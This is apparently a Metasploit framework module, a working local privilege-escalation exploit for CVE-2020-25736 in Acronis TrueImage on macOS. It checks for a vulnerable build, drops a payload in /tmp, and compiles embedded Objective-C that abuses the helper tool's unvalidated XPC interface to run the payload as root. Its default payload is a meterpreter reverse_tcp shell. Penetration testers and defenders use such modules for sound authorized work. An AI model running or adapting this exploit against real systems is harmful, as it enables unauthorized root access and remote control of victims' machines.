##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Post::Process
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Acronis TrueImage XPC Privilege Escalation',
        'Description' => %q{
          Acronis TrueImage versions 2019 update 1 through 2021 update 1
          are vulnerable to privilege escalation. The `com.acronis.trueimagehelper`
          helper tool does not perform any validation on connecting clients,
          which gives arbitrary clients the ability to execute functions provided
          by the helper tool with `root` privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Csaba Fitzl', # @theevilbit - Vulnerability Discovery
          'Shelby Pace' # Metasploit Module and Objective-c code
        ],
        'Platform' => [ 'osx' ],
        'Arch' => [ ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'CVE', '2020-25736' ]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp',
          'WfsDelay' => 15
        },
        'DisclosureDate' => '2020-11-11',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
        }
      )
    )

    register_options([
      OptString.new('WRITABLE_DIR', [ true, 'Writable directory to write the payload to', '/tmp' ])
    ])
  end

  def tmp_dir
    datastore['WRITABLE_DIR'].to_s
  end

  def exp_file_name
    @exp_file_name ||= Rex::Text.rand_text_alpha(5..10)
  end

  def check
    helper_location = '/Library/PrivilegedHelperTools'
    helper_svc_name = 'com.acronis.trueimagehelper'
    plist = '/Applications/Acronis True Image.app/Contents/Info.plist'

    return CheckCode::Safe unless file?("#{helper_location}/#{helper_svc_name}")
    return CheckCode::Safe unless file?(plist)

    plutil_cmd = "plutil -extract CFBundleVersion raw \'#{plist}\'"
    build_no = cmd_exec(plutil_cmd)
    return CheckCode::Safe if build_no.blank?

    build_no = build_no.to_i
    return CheckCode::Appears("Vulnerable build #{build_no} found") if build_no > 14170 && build_no < 33610

    CheckCode::Detected('Acronis version found is not vulnerable')
  end

  def exploit
    payload_name = Rex::Text.rand_text_alpha(5..10)
    @payload_path = "#{tmp_dir}/#{payload_name}"

    print_status("Attempting to write payload at #{@payload_path}")
    unless upload_and_chmodx(@payload_path, generate_payload_exe)
      fail_with(Failure::BadConfig, 'Failed to write payload. Consider changing WRITABLE_DIR option.')
    end
    vprint_good("Successfully wrote payload at #{@payload_path}")

    @pid = get_valid_pid
    exp_src = "#{exp_file_name}.m"
    exp_path = "#{tmp_dir}/#{exp_src}"
    exp_bin_path = "#{tmp_dir}/#{exp_file_name}"
    compile_cmd = "gcc -framework Foundation #{exp_path} -o #{exp_bin_path}"

    unless write_file(exp_path, objective_c_code)
      fail_with(Failure::BadConfig, 'Failed to write Objective-C exploit to disk. WRITABLE_DIR may need to be changed')
    end
    register_files_for_cleanup(@payload_path, exp_path, exp_bin_path)

    ret = cmd_exec(compile_cmd)
    fail_with(Failure::UnexpectedReply, "Failed to compile #{exp_src}") unless ret.blank?

    print_status("Successfully compiled #{exp_src}...Now executing payload")
    cmd_exec(exp_bin_path)
  end

  def objective_c_code
    <<~OBJC
      #import <Foundation/Foundation.h>

      @protocol HelperToolProtocol
      - (void)checkFullDiskAccessWithReply:(void (^)(BOOL))arg1;
      - (void)executeProcess:(NSString *)arg1 arguments:(NSArray *)arg2 caller:(int)arg3 withReply:(void (^)(int))arg4;
      - (void)getProcessIdentifierWithReply:(void (^)(int))arg1;
      @end

      int main(int argc, char *argv[])
      {
          NSString *payload = @"#{@payload_path}";
          NSArray *arg_array = @[@"-c", payload];

          NSString *service_name = @"com.acronis.trueimagehelper";
          NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
          NSXPCInterface *interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
          [connection setRemoteObjectInterface:interface];

          [connection resume];

          id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError *error)
          {
              return;
          }];

          [obj executeProcess:@"/bin/zsh" arguments:arg_array caller:#{@pid} withReply:^(int arg)
          {
              return;
          }];
      }
    OBJC
  end

  def get_valid_pid
    procs = get_processes
    return '1' if procs.empty?

    len = procs.length
    return '1' if len < 1

    rand_proc = procs[rand(1...len)]
    return '1' if rand_proc['pid'].to_s.blank?

    rand_proc['pid'].to_s
  end
end
